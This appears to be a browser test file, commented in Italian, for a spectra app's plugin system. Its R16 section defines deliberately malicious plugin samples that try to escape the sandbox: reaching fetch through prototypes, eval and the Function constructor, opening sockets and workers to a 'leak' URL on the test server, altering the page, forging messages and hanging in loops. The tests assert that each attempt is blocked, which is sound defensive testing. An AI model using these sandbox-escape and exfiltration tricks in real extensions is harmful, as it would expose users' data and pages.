// SPDX-FileCopyrightText: 2026 Lorenzo Birindelli
// SPDX-License-Identifier: GPL-3.0-or-later
// I11, estensioni per nuovi formati, nel browser vero (R16 isolamento, R17 correttezza dell'esempio).
// R16: estensioni malevole che provano DOM, rete (fetch, XHR, WebSocket, EventSource, importScripts, worker, eval e Function, timer con testo),
// archivio (IndexedDB, cache, file system), messaggi falsi alla pagina, ciclo infinito, uscita enorme, NaN: tutte fermate, la pagina
// resta reattiva e il server di prova non riceve nessuna richiesta. Anche con la CSP del desktop (src-tauri/tauri.conf.json).
// R17: l'esempio examples/plugins/colonne-fisse si installa dalle Impostazioni dopo l'avviso (autore, permessi, impronta SHA-256),
// i suoi file entrano nel caricamento e in «Canali trovati», il progetto registra estensione e versione, e se l'estensione manca
// all'apertura l'app avvisa e conserva i byte. Dati SINTETICI.
'use strict';
const test=require('node:test'), assert=require('node:assert'), fs=require('fs'), path=require('path'), crypto=require('crypto');
const JSZip=require('jszip'), F=require('../../app/project-format.js'), PC=require('../../app/plugins-base.js');
const {startServer, launch, openPage, ROOT}=require('./browser.js');
const EX=path.join(ROOT,'examples','plugins','colonne-fisse');
const PKG=fs.readFileSync(path.join(EX,'colonne-fisse.acchplugin')), SAMPLE=fs.readFileSync(path.join(EX,'esempio-SINTETICO.fwf'));
const SHA=crypto.createHash('sha256').update(PKG).digest('hex');
const EMOJI=/[\p{Extended_Pictographic}]/u;
const MAN={id:'it.prova.malevola', name:'Malevola', version:'0.0.1', author:'Prova R16', license:'MIT', extensions:['mal'], minAppVersion:'3.0.0'};
const CSP=JSON.parse(fs.readFileSync(path.join(ROOT,'src-tauri','tauri.conf.json'),'utf8')).app.security.csp;

const PAGE=()=>{ window.I11={
  bytes(s){ return new TextEncoder().encode(s); },
  async add(text, id){ const p=AcchPluginsCore.parsePackage(I11.bytes(text)); await AcchPlugins.ready; await AcchPlugins.install(p); return p.manifest.id; },
  async read(id, opt){ const t0=performance.now(); let lag=null; const pr=AcchPlugins.read(id, new TextEncoder().encode('dati').buffer, 'x.mal', opt);
    const t1=performance.now(); await new Promise(r=>setTimeout(r,150)); lag=performance.now()-t1;   // la pagina non si blocca mentre l'estensione lavora
    const r=await pr; return {r:r.error ? {error:r.error} : {meta:r.meta, ys:r.channels?Array.from(r.channels[0].ys):null, none:!!r.none}, ms:performance.now()-t0, lag, title:document.title, body:document.body.children.length}; },
  async load(name, text, answer){ let fin=false; const pr=addEntries([{file:new File([text], name), path:name}]).finally(()=>{ fin=true; }); let shown=null;
    while (!fin){ await new Promise(r=>setTimeout(r,20)); const d=$('#dlgChan'); if (d.open){ shown={title:$('#chTitle').textContent, cols:[...d.querySelectorAll('thead th')].slice(1).map(t=>t.textContent.trim()), checked:[...d.querySelectorAll('tbody input[data-r]')].map(i=>i.checked)}; d.querySelector('#chOk').click(); break; } }
    await pr; return {shown, list:I11.list(), note:$('#skipNote').innerText}; },
  list(){ return files.map(f=>({name:f.name, channel:f.channel||null, instr:f.instr, plugin:f.plugin||null, xs:Array.from(f.xs), ys:Array.from(f.ys), reason:f.reason})); },
  async build(){ const b=await AcchProject._build(); let s=''; for (let i=0;i<b.bytes.length;i+=0x8000) s+=String.fromCharCode.apply(null, b.bytes.subarray(i,i+0x8000)); return btoa(s); },
  async open(b64){ I11_TOASTS.length=0; const h=AcchProject.host, ask=h.ask; h.ask=async ()=>'discard';   // il lavoro aperto prima non si salva
    let ok; try{ ok=await AcchProject.openBytes(Uint8Array.from(atob(b64),c=>c.charCodeAt(0)),'i11.acchspettri',null); } finally { h.ask=ask; } return {ok, list:I11.list(), toasts:I11_TOASTS.slice(), missing:AcchProject.pluginMissing||[]}; }
}; window.I11_TOASTS=[]; const o=toast; toast=function(t){ I11_TOASTS.push(String(t)); return o.apply(this, arguments); }; };
async function withPage(b, server, opt, fn){ const {ctx, p, errors, external}=await openPage(b, server, Object.assign({canali:'chiedi'}, opt||{}));
  try{ await p.evaluate(PAGE); const r=await fn(p, external); assert.deepEqual(errors, []); return r; } finally { await ctx.close(); } }
const pkgOf=(code, m)=>PC.buildPackage(Object.assign({}, MAN, m||{}), code);

// estensioni malevole: ognuna deve essere fermata. LEAK è un indirizzo del server di prova che registra ogni richiesta
const EVIL=LEAK=>({
  rete:`registerReader(function(bytes, name){ var R=[], L=${JSON.stringify(LEAK)};
    function t(k, f){ try{ var v=f(); R.push(k+'='+(v==null?'vuoto':'APERTO')); }catch(e){ R.push(k+'=bloccato'); } }
    t('fetch', function(){ return fetch(L+'fetch'); });
    t('globalThis.fetch', function(){ return globalThis.fetch(L+'gt'); });
    t('prototipo', function(){ var o=self, f=null; while (o && !f){ var d=Object.getOwnPropertyDescriptor(o,'fetch'); if (d && d.value) f=d.value; o=Object.getPrototypeOf(o); } return f.call(self, L+'proto'); });
    t('xhr', function(){ var x=new XMLHttpRequest(); x.open('GET', L+'xhr', false); x.send(); return x.status; });
    t('websocket', function(){ return new WebSocket(L.replace('http','ws')+'ws'); });
    t('eventsource', function(){ return new EventSource(L+'es'); });
    t('importScripts', function(){ importScripts(L+'imp.js'); return 1; });
    t('worker', function(){ return new Worker(L+'w.js'); });
    t('sharedworker', function(){ return new SharedWorker(L+'sw.js'); });
    t('eval', function(){ return eval('fetch')(L+'eval'); });
    t('Function', function(){ return Function('return fetch')()(L+'fn'); });
    t('costruttore', function(){ return (function(){}).constructor('return fetch')()(L+'ctor'); });
    t('async', function(){ return (async function(){}).constructor('return 1'); });
    t('timer testo', function(){ return setTimeout('fetch("'+L+'timer")', 0); });
    t('indexedDB', function(){ return indexedDB.open('acch-plugins'); });
    t('caches', function(){ return caches.open('x'); });
    t('file system', function(){ return navigator.storage.getDirectory(); });
    t('broadcast', function(){ return new BroadcastChannel('acch'); });
    t('messaggio falso', function(){ self.postMessage({ok:true, out:{x:[1,2,3,4,5], y:[9,9,9,9,9]}}); return 1; });
    return {x:[1,2,3,4,5], y:[1,2,3,4,5], meta:R}; });`,
  dom:`registerReader(function(){ document.title='preso'; document.body.innerHTML=''; return {x:[1,2,3,4,5], y:[1,2,3,4,5]}; });`,
  finestra:`registerReader(function(){ return {x:[1,2,3,4,5], y:[1,2,3,4,5], meta:[typeof window, typeof parent, typeof top, typeof localStorage, typeof opener]}; });`,
  ciclo:`registerReader(function(){ for(;;){} });`,
  cicloAvvio:`for(;;){} registerReader(function(){ return null; });`,
  enorme:`registerReader(function(){ var x=new Float64Array(9000000); return {x:x, y:x}; });`,
  canali:`registerReader(function(){ var c=[]; for (var i=0;i<65;i++) c.push({x:[1,2,3,4,5], y:[1,2,3,4,5]}); return {channels:c}; });`,
  nan:`registerReader(function(){ return {x:[1,2,3,4,5], y:[1,2,NaN,4,5]}; });`,
  infinito:`registerReader(function(){ return {channels:[{x:[1,2,3,4,5], y:[1,2,3,4,1/0]}]}; });`,
  stringhe:`registerReader(function(){ return {x:['1','2','3','4','5'], y:[1,2,3,4,5]}; });`,
  promessa:`registerReader(function(){ return Promise.resolve({x:[1,2,3,4,5], y:[1,2,3,4,5]}); });`,
  sintassi:`registerReader(function({ `,
  getter:`registerReader(function(){ var o={}; Object.defineProperty(o,'x',{get:function(){ for(;;){} }}); o.y=[1]; return o; });`
});
async function evilRun(b, server, opt){ const hits=[]; const on=q=>{ if (/leak/.test(q.url)) hits.push(q.url); }; server.on('request', on);
  const LEAK=`http://127.0.0.1:${server.address().port}/leak-`;
  try{ return await withPage(b, server, opt, async (p, external)=>{ const out={};
    for (const [k, code] of Object.entries(EVIL(LEAK))){ out[k]=await p.evaluate(async ([code, man, k])=>{ const id=await I11.add(code); const r=await I11.read(id, {timeoutMs:/ciclo|getter/.test(k)?1500:8000}); await AcchPlugins.remove(id); return r; }, [pkgOf(code), MAN, k]); }
    out.extLeak=external.filter(u=>/leak/.test(u)); await new Promise(r=>setTimeout(r,300)); out.hits=hits.slice(); return out; }); }
  finally{ server.off('request', on); } }
function assertEvil(r){
  const meta=r.rete.r.meta; assert.ok(meta && meta.length>=19, JSON.stringify(r.rete)); for (const m of meta) assert.match(m, /=bloccato$/, 'rete: '+m);
  assert.deepEqual(r.rete.r.ys, [1,2,3,4,5], 'il messaggio falso dell\'estensione non arriva alla pagina');
  assert.deepEqual(r.hits, [], 'nessuna richiesta deve arrivare al server'); assert.deepEqual(r.extLeak, []);
  assert.match(r.dom.r.error, /document is not defined|errore dell'estensione/); assert.notEqual(r.dom.title, 'preso'); assert.ok(r.dom.body>0);
  assert.deepEqual(r.finestra.r.meta, ['undefined','undefined','undefined','undefined','undefined']);
  for (const k of ['ciclo','cicloAvvio','getter']){ assert.match(r[k].r.error, /fermata/, k); assert.ok(r[k].ms<4000, k+' '+r[k].ms); assert.ok(r[k].lag<1000, k+': pagina bloccata '+r[k].lag); }
  assert.match(r.enorme.r.error, /troppi dati/); assert.match(r.canali.r.error, /troppi dati/);
  assert.match(r.nan.r.error, /NaN/); assert.match(r.infinito.r.error, /NaN o infiniti/);
  assert.match(r.stringhe.r.error, /non validi/); assert.match(r.promessa.r.error, /promessa/); assert.match(r.sintassi.r.error, /interrotta/);
}

test('I11 estensioni', async t=>{
  const server=await startServer(), b=await launch();
  try{
    await t.test('R16 isolamento: DOM, rete, archivio, messaggi falsi, ciclo infinito, uscita enorme, NaN, promesse, errori di sintassi', async ()=>{
      assertEvil(await evilRun(b, server, {}));
    });
    await t.test('R16 isolamento con la CSP del desktop: il worker parte (worker-src blob:) e la rete resta chiusa', async ()=>{
      assert.match(CSP, /worker-src 'self' blob:/);
      // Tauri aggiunge alla CSP le impronte degli script della pagina; nella prova le sostituisce 'unsafe-inline', solo per script-src
      assertEvil(await evilRun(b, server, {desk:true, csp:CSP.replace("script-src 'self'", "script-src 'self' 'unsafe-inline'")}));
    });
    await t.test('installazione rifiutata: import, permessi sconosciuti, estensioni dell\'app, versione minima', async ()=>{
      const r=await withPage(b, server, {}, p=>p.evaluate(L=>L.map(s=>{ try{ AcchPlugins.inspect(new TextEncoder().encode(s)); return 'installabile'; }catch(e){ return AcchPlugins.errText(e); } }),
        [pkgOf('registerReader(function(){ return import("x"); });'), pkgOf('registerReader(function(){});', {permissions:['network']}), pkgOf('x', {extensions:['acchspettri']}), pkgOf('x', {minAppVersion:'9.0.0'}), 'non è json']));
      assert.match(r[0], /import/); assert.match(r[1], /permessi/); assert.match(r[2], /acchspettri/); assert.match(r[3], /9\.0\.0/); assert.match(r[4], /non è un pacchetto/);
    });
    for (const desk of [false, true]) await t.test(`R17 esempio colonne fisse (${desk?'desktop':'online'}): avviso, installazione, caricamento, «Canali trovati», progetto, estensione mancante`, async ()=>{
      await withPage(b, server, {desk}, async p=>{
        // prima dell'installazione il formato non è riconosciuto
        const before=await p.evaluate(s=>I11.load('esempio-SINTETICO.fwf', s), SAMPLE.toString('utf8'));
        assert.equal(before.list.length, 0); assert.match(before.note, /formato non riconosciuto|unrecognised|not recognised/i);
        // Impostazioni → Estensioni → Installa: avviso con autore, licenza, formati, permessi e impronta
        await p.evaluate(()=>AcchPlugins.ready); await p.evaluate(()=>AcchUi.openSettings()); await p.waitForSelector('#stPlugNone');
        await p.setInputFiles('#plugIn', {name:'colonne-fisse.acchplugin', mimeType:'application/json', buffer:PKG});
        await p.waitForSelector('#dlgPlugin[open]');
        const dlg=await p.evaluate(()=>({text:$('#dlgPlugin').innerText, sha:$('#plSha').textContent, focus:document.activeElement.id}));
        for (const s of ['Lorenzo Birindelli','GPL-3.0-or-later','.fwf','Permessi','non è firmata','SHA-256','rete']) assert.ok(dlg.text.includes(s), s+' in '+dlg.text);
        assert.equal(dlg.sha.replace(/ /g,''), SHA); assert.equal(dlg.focus, 'plCancel', 'il pulsante scelto di norma è Annulla');
        if (desk) assert.ok(!EMOJI.test(dlg.text), 'desktop senza emoji');
        await p.click('#plOk'); await p.waitForSelector('#stPlugins .plitem');
        const item=await p.evaluate(()=>$('#stPlugins').innerText); assert.match(item, /Colonne fisse \(esempio\)/); assert.match(item, new RegExp(SHA.slice(0,16)));
        await p.click('#stClose');
        // il formato entra in ACCEPT e nel flusso di caricamento, con la finestra «Canali trovati» per i due canali
        const r=await p.evaluate(s=>I11.load('esempio-SINTETICO.fwf', s), SAMPLE.toString('utf8'));
        assert.equal(r.shown && r.shown.title, 'Canali trovati'); assert.deepEqual(r.shown.cols, ['A 254 nm','B 280 nm']); assert.deepEqual(r.shown.checked, [true,true]);
        assert.deepEqual(r.list.map(f=>f.channel), ['A 254 nm','B 280 nm']); assert.ok(r.list.every(f=>f.instr==='uv'));
        assert.deepEqual(r.list[0].xs, [240,245,250,255,260,265,270,275,280,285]); assert.deepEqual(r.list[0].ys, [0.12,0.24,0.41,0.5,0.43,0.29,0.18,0.11,0.07,0.05]);
        assert.deepEqual(r.list[1].ys, [0.05,0.08,0.13,0.21,0.32,0.42,0.49,0.44,0.31,0.17]);
        assert.match(r.list[0].reason, /Colonne fisse \(esempio\)/);
        assert.equal(await p.evaluate(()=>!!(window.ACCH_SHELL===undefined || AcchPlugins.handlesName('a.fwf'))), true);
        // progetto: estensione, versione e impronta per ogni spettro; i byte una volta sola
        const b64=await p.evaluate(()=>I11.build()), P=await F.decode(Buffer.from(b64,'base64'), JSZip);
        assert.deepEqual(P.spectra.map(s=>s.plugin), [0,1].map(()=>({id:'org.acchiappaspettri.esempio.colonne-fisse', version:'1.0.0', name:'Colonne fisse (esempio)', sha256:SHA})));
        assert.equal(P.sources.length, 1); assert.ok(Buffer.from(P.sources[0].bytes).equals(SAMPLE));
        // riapertura con l'estensione: stessi numeri, niente finestra (i canali sono quelli salvati)
        const again=await p.evaluate(b=>I11.open(b), b64); assert.equal(again.ok, true); assert.deepEqual(again.list.map(f=>f.ys), r.list.map(f=>f.ys));
        // estensione disattivata: avviso, nessuno spettro, byte conservati al salvataggio successivo
        await p.evaluate(()=>AcchUi.openSettings()); await p.click('#stPlugins input[data-plen]'); await p.waitForFunction(()=>!AcchPlugins.available('org.acchiappaspettri.esempio.colonne-fisse')); await p.click('#stClose');
        const off=await p.evaluate(b=>I11.open(b), b64);
        assert.equal(off.ok, true); assert.equal(off.list.length, 0); assert.equal(off.missing.length, 2);
        assert.ok(off.toasts.some(m=>/non installata o disattivata/.test(m) && /Colonne fisse \(esempio\)» 1\.0\.0/.test(m)), off.toasts.join(' | '));
        const kept=await F.decode(Buffer.from(await p.evaluate(()=>I11.build()),'base64'), JSZip);
        assert.equal(kept.spectra.length, 2); assert.ok(Buffer.from(kept.sources[0].bytes).equals(SAMPLE)); assert.deepEqual(kept.spectra.map(s=>s.channel), ['A 254 nm','B 280 nm']); assert.ok(kept.spectra.every(s=>s.plugin && s.plugin.version==='1.0.0'));
        // riattivata: il progetto conservato si riapre con tutti i numeri
        await p.evaluate(()=>AcchUi.openSettings()); await p.click('#stPlugins input[data-plen]'); await p.waitForFunction(()=>AcchPlugins.available('org.acchiappaspettri.esempio.colonne-fisse'));
        // una versione nuova che non rilegge più il file: avviso, nessuno spettro, byte conservati (e la versione salvata resta quella di prima)
        await p.evaluate(t=>I11.add(t), PC.buildPackage(Object.assign(JSON.parse(fs.readFileSync(path.join(EX,'manifest.json'),'utf8')), {version:'2.0.0'}), 'registerReader(function(){ return {error:"formato cambiato"}; });'));
        const fail=await p.evaluate(b=>I11.open(b), b64);
        assert.equal(fail.ok, true); assert.equal(fail.list.length, 0); assert.ok(fail.toasts.some(m=>/non ha riletto 2 spettri/.test(m)), fail.toasts.join(' | '));
        const kept2=await F.decode(Buffer.from(await p.evaluate(()=>I11.build()),'base64'), JSZip);
        assert.ok(Buffer.from(kept2.sources[0].bytes).equals(SAMPLE)); assert.ok(kept2.spectra.every(s=>s.plugin.version==='1.0.0'));
        // rimozione (con conferma): elenco vuoto, il progetto conserva ancora i byte
        await p.click('#stPlugins button[data-plrm]'); await p.waitForSelector('#dlgConfirm[open]'); await p.click('#cfBtns .btn.primary');
        await p.waitForSelector('#stPlugNone'); await p.click('#stClose');
        const gone=await p.evaluate(b=>I11.open(b), b64); assert.equal(gone.list.length, 0); assert.equal(gone.missing.length, 2);
        const reread=await p.evaluate(b=>I11.open(b), (await p.evaluate(()=>I11.build())));
        assert.equal(reread.missing.length, 2, 'i byte passano intatti da un salvataggio all\'altro');
      });
    });
  } finally { await b.close(); server.close(); }
});
